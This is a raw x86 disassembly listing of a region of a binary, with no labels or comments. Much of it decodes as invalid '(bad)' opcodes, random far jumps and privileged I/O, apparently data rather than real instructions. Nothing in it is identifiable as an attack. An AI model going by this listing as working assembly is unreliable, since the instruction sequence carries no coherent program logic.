  42b274:	pusha  
  42b275:	adc    al,0xd1
  42b277:	pusha  
  42b278:	add    BYTE PTR [esi+0x25],ah
  42b27b:	jg     0x42b2e4
  42b27d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b27e:	dec    ebx
  42b27f:	sub    ecx,esi
  42b281:	mov    WORD PTR [ecx],ds
  42b283:	mov    esp,0x495e44fe
  42b288:	lods   al,BYTE PTR ds:[esi]
  42b289:	in     al,dx
  42b28a:	xchg   edi,eax
  42b28b:	or     al,0x2c
  42b28d:	xchg   edi,eax
  42b28e:	cmp    bl,BYTE PTR [ebx]
  42b290:	dec    eax
  42b291:	mov    ds:0xc048b9d4,eax
  42b296:	out    0x39,al
  42b298:	leave  
  42b299:	scas   al,BYTE PTR es:[edi]
  42b29a:	push   es
  42b29b:	adc    al,0x60
  42b29d:	js     0x42b2d2
  42b29f:	sub    bl,dl
  42b2a1:	xor    dl,al
  42b2a3:	mov    esp,0x14cb5176
  42b2a8:	dec    ecx
  42b2a9:	fimul  DWORD PTR [ebx+ecx*2+0x61]
  42b2ad:	pop    esi
  42b2ae:	mov    esi,0xac35a82e
  42b2b3:	aad    0x3f
  42b2b5:	adc    al,0x3b
  42b2b7:	(bad)  
  42b2b8:	out    dx,eax
  42b2b9:	pop    ebp
  42b2ba:	mov    ecx,0x9b076a16
  42b2bf:	stos   DWORD PTR es:[edi],eax
  42b2c0:	jmp    0xf22b:0x3d087d1d
  42b2c7:	mov    ecx,ebp
  42b2c9:	outs   dx,DWORD PTR ds:[esi]
  42b2ca:	mov    ebp,0xf62d703
  42b2cf:	lock add al,0xee
  42b2d2:	arpl   WORD PTR ds:0x481590b5,ax
  42b2d8:	les    eax,FWORD PTR [ebx+ecx*8+0x4d99ebf7]
  42b2df:	aaa    
  42b2e0:	test   bh,ah
  42b2e2:	lock dec esi
  42b2e4:	inc    ebx
  42b2e5:	inc    edi
  42b2e6:	dec    edi
  42b2e7:	mov    dl,BYTE PTR [edi]
  42b2e9:	jb     0x42b2c4
  42b2eb:	retf   
  42b2ec:	stc    
  42b2ed:	das    
	...
  42b356:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b357:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b35d:	iret   
  42b35e:	sub    eax,0x16738e65
  42b363:	aad    0xc4
  42b365:	and    esp,DWORD PTR [edi-0x31]
  42b368:	add    DWORD PTR [eax],eax
  42b36a:	add    BYTE PTR [ecx],al
  42b36c:	add    BYTE PTR [eax],al
  42b36e:	neg    DWORD PTR [ebp-0x37]
  42b371:	popf   
  42b372:	mov    ds:0x91368ec4,al
  42b377:	dec    edi
  42b378:	mov    WORD PTR [ebx-0x4463f7c9],cs
  42b37e:	ins    DWORD PTR es:[edi],dx
  42b37f:	ret    
  42b380:	cmc    
  42b381:	add    eax,0xcc1fd39
  42b386:	scas   al,BYTE PTR es:[edi]
  42b387:	ins    DWORD PTR es:[edi],dx
  42b388:	xchg   edx,eax
  42b389:	xchg   BYTE PTR [edi+ebp*4-0x74],ah
  42b38d:	sti    
  42b38e:	add    BYTE PTR [ebx+0x46],dh
  42b391:	lods   eax,DWORD PTR ds:[esi]
  42b392:	ds or  ah,bh
  42b395:	xchg   BYTE PTR [eax+0x6c],ah
  42b398:	pop    ss
  42b399:	mov    edx,DWORD PTR [eax+ecx*1]
  42b39c:	in     al,dx
  42b39d:	(bad)  
  42b39e:	mov    DWORD PTR [edx+0x79],ebp
  42b3a1:	sub    ebx,DWORD PTR ds:0x29c4b491
  42b3a7:	inc    esi
  42b3a8:	jmp    0x719d5838
  42b3ad:	push   ds
  42b3ae:	push   ebx
  42b3af:	lock out 0x46,al
  42b3b2:	push   esi
  42b3b3:	pushf  
  42b3b4:	xchg   ebp,eax
  42b3b5:	dec    edx
  42b3b6:	push   cs
  42b3b7:	cli    
  42b3b8:	(bad)  
  42b3b9:	stos   DWORD PTR es:[edi],eax
  42b3ba:	xor    BYTE PTR [edi],ch
  42b3bc:	pop    ebp
  42b3bd:	lahf   
  42b3be:	inc    esi
  42b3bf:	popa   
  42b3c0:	mov    al,0x22
  42b3c2:	in     al,dx
  42b3c3:	cmp    ebx,edi
  42b3c5:	stc    
  42b3c6:	mov    eax,ds:0x291f7112
  42b3cb:	je     0x42b3da
  42b3cd:	mov    eax,0xf4f25dd7
  42b3d2:	xchg   ebp,eax
  42b3d3:	pusha  
  42b3d4:	lds    edx,FWORD PTR [edi]
  42b3d6:	test   BYTE PTR [ebx],al
  42b3d8:	retf   0x408f
  42b3db:	xchg   ecx,edi
  42b3dd:	pop    ebp
  42b3de:	push   eax
  42b3df:	popa   
  42b3e0:	icebp  
  42b3e1:	sub    DWORD PTR [edx+edx*1-0x7a],ecx
  42b3e5:	pop    es
  42b3e6:	xor    BYTE PTR [ebp-0x3d],0x4a
  42b3ea:	popf   
  42b3eb:	jl     0x42b442
  42b3ed:	and    BYTE PTR ds:0xcf80df02,ch
  42b3f3:	dec    edi
  42b3f4:	int    0x2d
  42b3f6:	or     BYTE PTR [ebp+0x17],bl
  42b3f9:	push   esp
  42b3fa:	int3   
  42b3fb:	jp     0x42b433
  42b3fd:	ror    dl,0x1c
  42b400:	div    DWORD PTR [edi]
  42b402:	pop    edi
  42b403:	or     BYTE PTR [edx+0x24],bh
  42b406:	push   esi
  42b407:	retf   
  42b408:	sbb    al,0x40
  42b40a:	jbe    0x42b3cd
  42b40c:	dec    edx
  42b40d:	lds    edx,FWORD PTR [edx-0x38]
  42b410:	xlat   BYTE PTR ds:[ebx]
  42b411:	ret    0xdaea
  42b414:	fisub  DWORD PTR [esi+0x5f]
  42b417:	jnp    0x42b3c5
  42b419:	dec    ebp
  42b41a:	inc    ecx
  42b41b:	ins    DWORD PTR es:[edi],dx
  42b41c:	push   ss
  42b41d:	push   ebx
  42b41e:	cld    
  42b41f:	sbb    al,0xf3
  42b421:	or     eax,0xf6bcad8b
  42b426:	mov    eax,fs:0xe97d47c9
  42b42c:	out    0x5f,eax
  42b42e:	inc    ebp
  42b42f:	cmp    edx,0x28
  42b432:	dec    edx
  42b433:	cmp    ah,BYTE PTR [esi+0x6b]
  42b436:	fsub   DWORD PTR [edi+0x3362ec8]
  42b43c:	cld    
  42b43d:	bound  ebx,QWORD PTR [ebx+edx*2+0x185ead0]
  42b444:	cwde   
  42b445:	push   cs
  42b446:	pop    es
  42b447:	fmul   DWORD PTR [ebx]
  42b449:	loopne 0x42b446
  42b44b:	dec    esi
  42b44c:	les    esp,FWORD PTR [ecx+0x4f3d4770]
  42b452:	jle    0x42b4a0
  42b454:	or     eax,0x80c0a5a6
  42b459:	sbb    eax,0x52128df7
  42b45e:	les    esp,FWORD PTR [ebp-0x6f]
  42b461:	shl    BYTE PTR [ebx+ebp*4],cl
  42b464:	cwde   
  42b465:	out    0xf5,al
  42b467:	in     eax,0x89
  42b469:	lahf   
  42b46a:	xor    edx,DWORD PTR [ebx+0x7673]
	...
  42b4d4:	add    BYTE PTR [eax],al
  42b4d6:	mov    al,BYTE PTR [ebp+0x20]
  42b4d9:	out    dx,al
  42b4da:	out    dx,eax
  42b4db:	out    dx,eax
  42b4dc:	into   
  42b4dd:	gs jo  0x42b4b0
  42b4e0:	cld    
  42b4e1:	test   esp,ebx
  42b4e3:	sub    eax,0xd067cd29
  42b4e8:	add    DWORD PTR [eax],eax
  42b4ea:	add    BYTE PTR [ecx],al
  42b4ec:	add    BYTE PTR [eax],al
  42b4ee:	ins    BYTE PTR es:[edi],dx
  42b4ef:	or     eax,0x73e80f96
  42b4f4:	sbb    ecx,DWORD PTR [ebp+ebx*2-0x49]
  42b4f8:	lea    ecx,[ecx]
  42b4fa:	xchg   edi,eax
  42b4fb:	fs inc edx
  42b4fd:	sbb    BYTE PTR [ebp-0x1e],dh
  42b500:	inc    esp
  42b501:	add    DWORD PTR [ebx+esi*2],eax
  42b504:	in     eax,0x78
  42b506:	lods   eax,DWORD PTR ds:[esi]
  42b507:	or     ebp,DWORD PTR [eax+ebp*8+0x30be7a3a]
  42b50e:	or     eax,0x5c71328b
  42b513:	add    eax,0xeeb33561
  42b518:	clc    
  42b519:	retf   
  42b51a:	adc    al,0xdb
  42b51c:	stos   DWORD PTR es:[edi],eax
  42b51d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b51e:	xor    esp,DWORD PTR [esi+0x5c601de6]
  42b524:	dec    esp
  42b525:	mov    esp,0xe713612a
  42b52a:	retf   0x7534
  42b52d:	mov    ds:0xe36d787e,al
  42b532:	or     edi,DWORD PTR [ebp-0x6056912b]
  42b538:	int3   
  42b539:	bound  edx,QWORD PTR [eax+0x48]
  42b53c:	jne    0x42b4c2
  42b53e:	mov    ah,0xdf
  42b540:	cs jl  0x42b551
  42b543:	mov    esp,0x552fb049
  42b548:	cmp    esp,DWORD PTR [edi-0x22]
  42b54b:	aas    
  42b54c:	mov    ah,0xc3
  42b54e:	lahf   
  42b54f:	mov    bl,0xd8
  42b551:	mov    BYTE PTR [ebx],dh
  42b553:	mov    eax,ds:0x89cf0dc1
  42b558:	loope  0x42b555
  42b55a:	in     eax,dx
  42b55b:	hlt    
  42b55c:	inc    ebx
  42b55d:	cwde   
  42b55e:	pop    ds
  42b55f:	nop
  42b560:	loop   0x42b501
  42b562:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b563:	loope  0x42b532
  42b565:	xchg   ebx,ecx
  42b567:	cmp    BYTE PTR [esp+ebp*8+0x62],bl
  42b56b:	retf   0x34e7
  42b56e:	xchg   edi,eax
  42b56f:	aad    0x4c
  42b571:	sub    dh,ch
  42b573:	mov    eax,0x1884fcec
  42b578:	repnz inc esp
  42b57a:	push   edx
  42b57b:	imul   ebp,eax,0xffffffbc
  42b57e:	pushf  
  42b57f:	push   esi
  42b580:	push   ebx
  42b581:	xchg   cl,bl
  42b583:	inc    esi
  42b584:	daa    
  42b585:	xchg   edx,eax
  42b586:	and    dl,dl
  42b588:	shl    BYTE PTR [edi],0x7f
  42b58b:	hlt    
  42b58c:	add    ebp,DWORD PTR ds:0xf9fb2faf
  42b592:	pop    edi
  42b593:	sahf   
  42b594:	adc    al,0x6f
  42b596:	pop    eax
  42b597:	add    ebx,DWORD PTR [eax+0x31]
  42b59a:	sub    edi,edi
  42b59c:	inc    ebp
  42b59d:	pop    ds
  42b59e:	fcom   DWORD PTR [edx-0x2e]
  42b5a1:	mov    cl,0x95
  42b5a3:	mov    ds:0xc2e0a780,eax
  42b5a8:	lahf   
  42b5a9:	(bad)  
  42b5aa:	mov    es,WORD PTR [edi-0x11356d82]
  42b5b0:	sbb    BYTE PTR [edi+0x39f9e6b5],ch
  42b5b6:	adc    ebx,DWORD PTR [ebp+0x17c6315e]
  42b5bc:	mov    esp,DWORD PTR [edx+0x29f0ce8b]
  42b5c2:	popa   
  42b5c3:	cs xor eax,0xa8d87931
  42b5c9:	add    BYTE PTR [edx+0x39],bh
  42b5cc:	adc    eax,0xcebc529d
  42b5d1:	jg     0x42b623
  42b5d3:	hlt    
  42b5d4:	push   0x1f
  42b5d6:	lods   eax,DWORD PTR ds:[esi]
  42b5d7:	int    0xf5
  42b5d9:	xor    BYTE PTR [ebx-0x1b53f5ac],bh
  42b5df:	stos   BYTE PTR es:[edi],al
  42b5e0:	push   eax
  42b5e1:	dec    esi
  42b5e2:	nop
  42b5e3:	push   edi
  42b5e4:	add    ax,0x36d4
  42b5e8:	shl    BYTE PTR [edi+0x40f056ca],cl
	...
  42b656:	loopne 0x42b5ec
  42b658:	and    bh,cl
  42b65a:	je     0x42b65b
  42b65c:	out    dx,eax
  42b65d:	mov    edi,0x1397875f
  42b662:	mov    eax,ds:0x6792da77
  42b667:	rol    DWORD PTR [ecx],1
  42b669:	add    BYTE PTR [eax],al
  42b66b:	add    DWORD PTR [eax],eax
  42b66d:	add    bl,al
  42b66f:	test   al,0x75
  42b671:	out    dx,al
  42b672:	sbb    bh,BYTE PTR [eax-0x23]
  42b675:	push   eax
  42b676:	cmp    esi,ecx
  42b678:	add    bl,bl
  42b67a:	stos   BYTE PTR es:[edi],al
  42b67b:	pushf  
  42b67c:	loopne 0x42b62c
  42b67e:	sub    BYTE PTR cs:[ebx+0x36],ch
  42b682:	jbe    0x42b67d
  42b684:	imul   edi,ecx,0x392ab93
  42b68a:	and    eax,0x48a44fcf
  42b68f:	cmp    DWORD PTR [ecx+0x27],esi
  42b692:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b693:	pusha  
  42b694:	adc    ch,dl
  42b696:	dec    esp
  42b697:	iret   
  42b698:	sub    cl,BYTE PTR [edi]
  42b69a:	mov    ecx,0x96644ea3
  42b69f:	dec    ecx
  42b6a0:	shr    eax,1
  42b6a2:	lock leave 
  42b6a4:	push   ss
  42b6a5:	lahf   
  42b6a6:	lidtd  [ebx-0x1093adf0]
  42b6ad:	lea    ebp,[edx]
  42b6af:	dec    ebx
  42b6b0:	add    eax,0x6d8998d0
  42b6b5:	fild   DWORD PTR [ecx]
  42b6b7:	add    esi,DWORD PTR ds:0x5f2ae212
  42b6bd:	das    
  42b6be:	jp     0x42b688
  42b6c0:	scas   eax,DWORD PTR es:[edi]
  42b6c1:	out    0xdf,eax
  42b6c3:	add    DWORD PTR [edx+ecx*2+0xd332c7a],edi
  42b6ca:	gs enter 0x19cb,0x5e
  42b6cf:	inc    ebx
  42b6d0:	xchg   edx,eax
  42b6d1:	sti    
  42b6d2:	jb     0x42b67d
  42b6d4:	les    edx,FWORD PTR [edx+0x231fb7a4]
  42b6da:	jp     0x42b689
  42b6dc:	retf   
  42b6dd:	fistp  QWORD PTR [ebp+ebp*4-0x80]
  42b6e1:	xor    eax,0xc9b43c7c
  42b6e6:	and    esp,eax
  42b6e8:	mov    ds:0x6b8a2a9,al
  42b6ed:	(bad)  
  42b6ee:	(bad)  
  42b6ef:	les    esi,FWORD PTR [edi-0x665f1eed]
  42b6f5:	inc    esi
  42b6f6:	sti    
  42b6f7:	lods   eax,DWORD PTR ds:[esi]
  42b6f8:	push   edi
  42b6f9:	jg     0x42b688
  42b6fb:	xor    BYTE PTR ds:0x14b71117,cl
  42b701:	cs push cs
  42b703:	inc    esi
  42b704:	popa   
  42b705:	inc    esp
  42b706:	aas    
  42b707:	daa    
  42b708:	xor    WORD PTR [ebx],0xa6d8
  42b70d:	push   0x5e
  42b70f:	xchg   ecx,eax
  42b710:	fwait
  42b711:	loope  0x42b78a
  42b713:	inc    eax
  42b714:	xor    eax,DWORD PTR [edi+0x4e]
  42b717:	pop    ss
  42b718:	jb     0x42b725
  42b71a:	das    
  42b71b:	mov    al,0x7e
  42b71d:	jle    0x42b78c
  42b71f:	add    cl,BYTE PTR [edx+0x21]
  42b722:	cmp    DWORD PTR [eiz*4-0x26ccfdc9],edi
  42b729:	popf   
  42b72a:	(bad)  
  42b72b:	push   0x2c9b9ab
  42b730:	pop    ebp
  42b731:	ins    DWORD PTR es:[edi],dx
  42b732:	in     eax,0x54
  42b734:	push   ecx
  42b735:	push   ds
  42b736:	add    DWORD PTR [ecx-0x28e84c52],esp
  42b73c:	ret    
  42b73d:	not    BYTE PTR [eax+edi*1-0x42]
  42b741:	sub    DWORD PTR ds:0xc0e963f1,ebx
  42b747:	fwait
  42b748:	rcl    DWORD PTR [ebx+ebp*8-0x524c147f],cl
  42b74f:	cmp    al,0x52
  42b751:	xor    BYTE PTR [edx+0x11],bl
  42b754:	or     DWORD PTR [eax+edi*8+0x37e620a3],ebx
  42b75b:	in     eax,dx
  42b75c:	scas   eax,DWORD PTR es:[edi]
  42b75d:	cmp    DWORD PTR [ecx-0x411bbddd],edi
  42b763:	pop    ecx
  42b764:	pop    ds
  42b765:	gs jmp 0xc9dc:0x353b1e8f
  42b76d:	push   cs
	...
  42b7d6:	dec    esi
  42b7d7:	inc    edx
  42b7d8:	dec    ecx
  42b7d9:	daa    
  42b7da:	dec    ebp
  42b7db:	das    
  42b7dc:	outs   dx,BYTE PTR ds:[esi]
  42b7dd:	imul   edx,edx,0x63
  42b7e0:	push   ecx
  42b7e1:	xchg   edx,eax
  42b7e2:	mov    bh,0x9f
  42b7e4:	pop    edx
  42b7e5:	imul   esp,DWORD PTR [edi-0x2e],0x1
  42b7e9:	add    BYTE PTR [eax],al
  42b7eb:	add    DWORD PTR [eax],eax
  42b7ed:	add    BYTE PTR [edi],bl
  42b7ef:	jmp    0x6966:0x7a73dc46
  42b7f6:	jae    0x42b7df
  42b7f8:	call   0x208b:0xa0724bca
  42b7ff:	push   ebp
  42b800:	icebp  
  42b801:	xchg   esi,eax
  42b802:	push   esi
  42b803:	sub    esp,DWORD PTR [ebp+0x24]
  42b806:	inc    eax
  42b807:	aaa    
  42b808:	out    0xdb,eax
  42b80a:	int    0xcd
  42b80c:	fs fcom st(6)
  42b80f:	push   0xb
  42b811:	shl    edx,1
  42b813:	mov    ecx,DWORD PTR [bp+di]
  42b816:	push   0x4c2b8b9c
  42b81b:	das    
  42b81c:	or     edx,ebx
  42b81e:	ds test eax,0x17b60df9
  42b824:	es mov edx,0xa21f5559
  42b82a:	fadd   QWORD PTR [esp+ebp*2]
  42b82d:	fmul   st,st(2)
  42b82f:	sub    BYTE PTR [edx],bl
  42b831:	loope  0x42b7c0
  42b833:	and    al,0x94
  42b835:	jb     0x42b807
  42b837:	loopne 0x42b7f0
  42b839:	or     eax,0x6a1c8292
  42b83e:	xor    ebx,0xe37ae46c
  42b844:	stos   BYTE PTR es:[edi],al
  42b845:	mov    cl,0x4c
  42b847:	xor    esp,ebp
  42b849:	das    
  42b84a:	push   eax
  42b84b:	pop    eax
  42b84c:	inc    edi
  42b84d:	sub    cl,BYTE PTR [ebx+edi*1+0x644a598a]
  42b854:	call   0xac77:0xdd13a795
  42b85b:	test   esp,eax
  42b85d:	mov    esp,0x90bcfcc2
  42b862:	sub    dl,0x6c
  42b865:	sub    BYTE PTR [edi-0x614de693],0xa8
  42b86c:	jnp    0x42b862
  42b86e:	test   BYTE PTR [ebx-0x2a001821],bl
  42b874:	cmp    sp,WORD PTR [ebx]
  42b877:	dec    edx
  42b878:	and    DWORD PTR [eax],edi
  42b87a:	cmp    DWORD PTR [edi+0x33],0xe6cacb3f
  42b881:	stos   BYTE PTR es:[edi],al
  42b882:	mov    eax,0x62bfd1eb
  42b887:	rep ins DWORD PTR es:[edi],dx
  42b889:	adc    cl,bl
  42b88b:	sti    
  42b88c:	push   eax
  42b88d:	push   ebx
  42b88e:	xchg   ebp,eax
  42b88f:	push   0x2f5a25b8
  42b894:	dec    edx
  42b895:	lds    eax,FWORD PTR [edi+0x2a53a799]
  42b89b:	scas   eax,DWORD PTR es:[edi]
  42b89c:	xchg   ebx,eax
  42b89d:	mov    ch,0x9
  42b89f:	pop    ds
  42b8a0:	aam    0x9c
  42b8a2:	fwait
  42b8a3:	(bad)  
  42b8a4:	jge    0x42b86f
  42b8a6:	dec    ebp
  42b8a7:	adc    DWORD PTR [ecx+esi*4],edi
  42b8aa:	mov    ecx,edi
  42b8ac:	push   0x33
  42b8ae:	(bad)  
  42b8b0:	ret    0x5e24
  42b8b3:	xor    eax,0xa4e69f38
  42b8b8:	jle    0x42b909
  42b8ba:	(bad)  
  42b8bb:	sbb    eax,0xb9319cd0
  42b8c0:	sbb    BYTE PTR [edi+eiz*4+0x1d],ch
  42b8c4:	fld    TBYTE PTR [esi+ecx*8-0x2effa2d7]
  42b8cb:	mov    ebp,0x8ddf09b8
  42b8d0:	sahf   
  42b8d1:	pop    esp
  42b8d2:	cli    
  42b8d3:	mov    cl,0x23
  42b8d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b8d6:	sbb    ebx,DWORD PTR [edx+ebx*1-0x1d6ec36]
  42b8dd:	loope  0x42b88b
  42b8df:	fsub   DWORD PTR ds:0x83fbbf3f
  42b8e5:	das    
  42b8e6:	push   0x2e
  42b8e8:	inc    ebx
  42b8e9:	fld    DWORD PTR [ebx+0x394023]
	...
  42b953:	add    BYTE PTR [eax],al
  42b955:	add    al,ch
  42b957:	popf   
  42b958:	mov    esi,0xf9e7ffe7
  42b95d:	lahf   
  42b95e:	ret    0x608c
  42b961:	or     ebp,DWORD PTR [eax+0x67e278b8]
  42b967:	rol    DWORD PTR [ecx],cl
  42b969:	add    BYTE PTR [eax],al
  42b96b:	add    DWORD PTR [eax],eax
  42b96d:	add    BYTE PTR [edx+0x5a],dh
  42b970:	mov    al,0x7b
  42b972:	iret   
  42b973:	inc    edx
  42b974:	mov    edx,0xd333ccf2
  42b979:	jns    0x42b91a
  42b97b:	cdq    
  42b97c:	jmp    0x473:0x2df26f2f
  42b983:	xchg   BYTE PTR [edx+edx*8+0x68f328fc],dh
  42b98a:	pop    edx
  42b98b:	push   es
  42b98c:	mov    edi,0xfcd986b9
  42b991:	sub    DWORD PTR [esi+eax*1],eax
  42b994:	mov    al,0x3b
  42b996:	call   0xcbac9ca3
  42b99b:	mov    edi,0x8911c721
  42b9a0:	inc    edx
  42b9a1:	jl     0x42b9c5
  42b9a3:	xor    ah,BYTE PTR [edi-0x40efec27]
  42b9a9:	(bad)  
  42b9aa:	mov    esp,0xe2f0729e
  42b9af:	rcl    BYTE PTR [ecx+0x41],cl
  42b9b2:	sbb    BYTE PTR [ebp-0x3d],bl
  42b9b5:	add    ah,BYTE PTR [di]
  42b9b8:	test   esp,ecx
  42b9ba:	adc    eax,0x6dde70cb
  42b9bf:	mov    WORD PTR [esi-0x2a],es
  42b9c2:	imul   edi,ebx,0xffffff8b
  42b9c5:	repnz xchg esi,eax
  42b9c7:	mov    al,0xd8
  42b9c9:	nop
  42b9ca:	jo     0x42b9f5
  42b9cc:	cdq    
  42b9cd:	in     eax,0x47
  42b9cf:	mov    ds:0x19fb1f21,al
  42b9d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b9d5:	xacquire xchg DWORD PTR [edi+ebx*1+0x2f],edi
  42b9da:	mov    edx,0xbae1e41
  42b9df:	mov    ds:0x3ec80430,eax
  42b9e4:	outs   dx,BYTE PTR ds:[esi]
  42b9e5:	xchg   ebp,eax
  42b9e6:	sbb    al,0x31
  42b9e8:	cmp    eax,0x1a3f8eb
  42b9ed:	mov    ds:0x2690f10f,al
  42b9f2:	in     eax,dx
  42b9f3:	jns    0x42ba49
  42b9f5:	mov    dh,0x8d
  42b9f7:	shl    BYTE PTR [edx+0x23],1
  42b9fa:	das    
  42b9fb:	push   0x6f
  42b9fd:	inc    esi
  42b9fe:	xor    DWORD PTR [ecx],0x549732dd
  42ba04:	add    ch,ch
  42ba06:	sbb    eax,0xcd0008d8
  42ba0b:	sub    DWORD PTR [ebp-0x1],edi
  42ba0e:	sub    ecx,esi
  42ba10:	clc    
  42ba11:	cdq    
  42ba12:	mov    ah,0xae
  42ba14:	test   al,0xaf
  42ba16:	xor    DWORD PTR [esi+ebp*2-0x1],ecx
  42ba1a:	repnz (bad) 
  42ba1d:	pop    ebp
  42ba1e:	lods   al,BYTE PTR ds:[esi]
  42ba1f:	mov    cl,BYTE PTR [ebx]
  42ba21:	pop    edx
  42ba22:	push   ds
  42ba23:	add    ebx,DWORD PTR [ebp-0x38]
  42ba26:	cmp    eax,0xf85c99e7
  42ba2b:	gs inc ebx
  42ba2d:	sbb    eax,0x29b2d931
  42ba32:	adc    DWORD PTR [esi-0x6ca43f30],ebp
  42ba38:	inc    edx
  42ba39:	ds popa 
  42ba3b:	das    
  42ba3c:	fbld   TBYTE PTR [eiz*8-0x2ebe142d]
  42ba43:	xor    al,0xa8
  42ba45:	inc    edx
  42ba46:	scas   al,BYTE PTR es:[edi]
  42ba47:	loop   0x42b9df
  42ba49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ba4a:	add    eax,edx
  42ba4c:	push   ebx
  42ba4d:	rcl    ecx,0x4f
  42ba50:	sbb    BYTE PTR [edi+0x74d851ac],0x5d
  42ba57:	jns    0x42ba42
  42ba59:	lods   al,BYTE PTR es:[esi]
  42ba5b:	out    dx,al
  42ba5c:	repnz repz and bh,BYTE PTR [edi-0x31]
  42ba61:	sar    DWORD PTR ds:0xa7854b70,1
  42ba67:	xchg   ebx,eax
  42ba68:	pusha  
  42ba69:	sub    al,0xcb
  42ba6b:	sbb    BYTE PTR [ebx-0x3c],dl
	...
  42bad6:	mov    eax,DWORD PTR [edi]
  42bad8:	mov    al,0xe2
  42bada:	mov    esp,0x6a6fdbf7
  42badf:	pop    ebx
  42bae0:	xchg   ecx,eax
  42bae1:	or     DWORD PTR [edx+0x6732e874],edi
  42bae7:	aam    0x1
  42bae9:	add    BYTE PTR [eax],al
  42baeb:	add    DWORD PTR [eax],eax
  42baed:	add    bh,cl
  42baef:	dec    esi
  42baf0:	xlat   BYTE PTR ds:[ebx]
  42baf1:	ins    DWORD PTR es:[edi],dx
  42baf2:	scas   eax,DWORD PTR es:[edi]
  42baf3:	cmp    al,0xd7
  42baf5:	inc    ecx
  42baf6:	sbb    ebp,DWORD PTR ds:0xd53b291e
  42bafc:	adc    BYTE PTR [eax+0xc08cfa7],dh
  42bb02:	add    al,0x38
  42bb04:	cmp    BYTE PTR [eiz*2-0x543a3f22],0x3c
  42bb0c:	jg     0x42bad1
  42bb0e:	gs loope 0x42bab0
  42bb11:	inc    eax
  42bb12:	xchg   ebp,eax
  42bb13:	ins    BYTE PTR es:[edi],dx
  42bb14:	mov    bl,0x7d
  42bb16:	pushf  
  42bb17:	aad    0x34
  42bb19:	es inc ecx
  42bb1b:	lds    ecx,FWORD PTR [esi+edx*4]
  42bb1e:	cdq    
  42bb1f:	push   0xf29e1a3a
  42bb24:	push   ds
  42bb25:	sbb    edi,DWORD PTR [edi+ebp*8+0xa]
  42bb29:	daa    
  42bb2a:	push   ebp
  42bb2b:	iret   
  42bb2c:	jl     0x42bb3e
  42bb2e:	inc    eax
  42bb2f:	in     al,0x2d
  42bb31:	pop    edx
  42bb32:	push   ebp
  42bb33:	and    al,0x11
  42bb35:	mov    es,esp
  42bb37:	xlat   BYTE PTR ds:[ebx]
  42bb38:	ret    0x3cc0
  42bb3b:	jmp    0x42bbbb
  42bb3d:	mov    ebp,0xee8d2678
  42bb42:	jmp    0xc16:0x336b4276
  42bb49:	nop
  42bb4a:	cmp    eax,0xa805866
  42bb4f:	jmp    0x6cc2d08f
  42bb54:	or     dl,0xeb
  42bb57:	mov    ds:0xf607037d,eax
  42bb5c:	pop    ebx
  42bb5d:	dec    esi
  42bb5e:	jp     0x42bbce
  42bb60:	jbe    0x42bb77
  42bb62:	aaa    
  42bb63:	fst    DWORD PTR [ebx-0x21]
  42bb66:	mov    ecx,0xf49aaedd
  42bb6b:	dec    eax
  42bb6c:	push   ebx
  42bb6d:	or     eax,0x88aacc4
  42bb72:	mov    dl,0x71
  42bb74:	fmul   DWORD PTR [ebx-0xc]
  42bb77:	js     0x42bb35
  42bb79:	(bad)  
  42bb7a:	popa   
  42bb7b:	cmp    ch,dh
  42bb7d:	mov    al,ds:0x41280a6
  42bb82:	sar    BYTE PTR [ebp-0x1385fda1],cl
  42bb88:	cmp    bh,BYTE PTR [ebp-0x70]
  42bb8b:	xchg   ebp,eax
  42bb8c:	push   cs
  42bb8d:	add    eax,0x2d48993f
  42bb92:	clc    
  42bb93:	aam    0x46
  42bb95:	jmp    0x42bbec
  42bb97:	adc    BYTE PTR [ebx-0x6a],bl
  42bb9a:	mov    gs,WORD PTR [ebp-0x43dc5ed9]
  42bba0:	cwde   
  42bba1:	mov    edi,0xb68bf474
  42bba6:	(bad)  
  42bba7:	and    BYTE PTR [edi],ch
  42bba9:	dec    edi
  42bbaa:	cli    
  42bbab:	(bad)  
  42bbac:	mov    al,ds:0xff6312e3
  42bbb1:	add    eax,0x7698ff50
  42bbb6:	push   esp
  42bbb7:	fwait
  42bbb8:	xor    eax,0xe36ac694
  42bbbd:	and    esi,esi
  42bbbf:	or     BYTE PTR [edi],ah
  42bbc1:	push   ax
  42bbc3:	mov    DWORD PTR [eax-0x2d0092e],ebx
  42bbc9:	nop
  42bbca:	aad    0x1f
  42bbcc:	jl     0x42bb96
  42bbce:	xor    ebx,DWORD PTR [esi]
  42bbd0:	arpl   si,ax
  42bbd2:	pop    ecx
  42bbd3:	adc    DWORD PTR ds:0x2711b63e,ebp
  42bbd9:	sahf   
  42bbda:	mov    esi,0x23b2879
  42bbdf:	gs (bad) 
  42bbe1:	jmp    0x2c71:0x53cb1b2e
  42bbe8:	push   ebx
  42bbe9:	into   
  42bbea:	or     DWORD PTR [eax],eax
  42bbec:	fst    DWORD PTR [edx+0x0]
	...
  42bc56:	xor    al,0x28
  42bc58:	add    DWORD PTR [esi],eax
  42bc5a:	sbb    eax,0x233a372f
  42bc5f:	sub    DWORD PTR [ebx],eax
  42bc61:	dec    ecx
  42bc62:	dec    eax
  42bc63:	dec    eax
  42bc64:	aaa    
  42bc65:	jnp    0x42bcce
  42bc67:	aad    0x1
  42bc69:	add    BYTE PTR [eax],al
  42bc6b:	add    DWORD PTR [eax],eax
  42bc6d:	add    cl,ch
  42bc6f:	out    0x96,al
  42bc71:	cmc    
  42bc72:	inc    ebx
  42bc73:	into   
  42bc74:	mov    eax,cs:0xf1c2c805
  42bc7a:	pop    esp
  42bc7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bc7c:	xor    DWORD PTR [eax-0x1b],ecx
  42bc7f:	fs push ebx
  42bc81:	xor    bl,BYTE PTR [ebx+0x17]
  42bc84:	mov    esp,0x60bb52b
  42bc89:	and    cl,BYTE PTR [ecx]
  42bc8b:	push   ebx
  42bc8c:	pop    ebx
  42bc8d:	mov    eax,ds:0xed476d1c
  42bc92:	ficom  WORD PTR [ebp+0x6e]
  42bc95:	push   ss
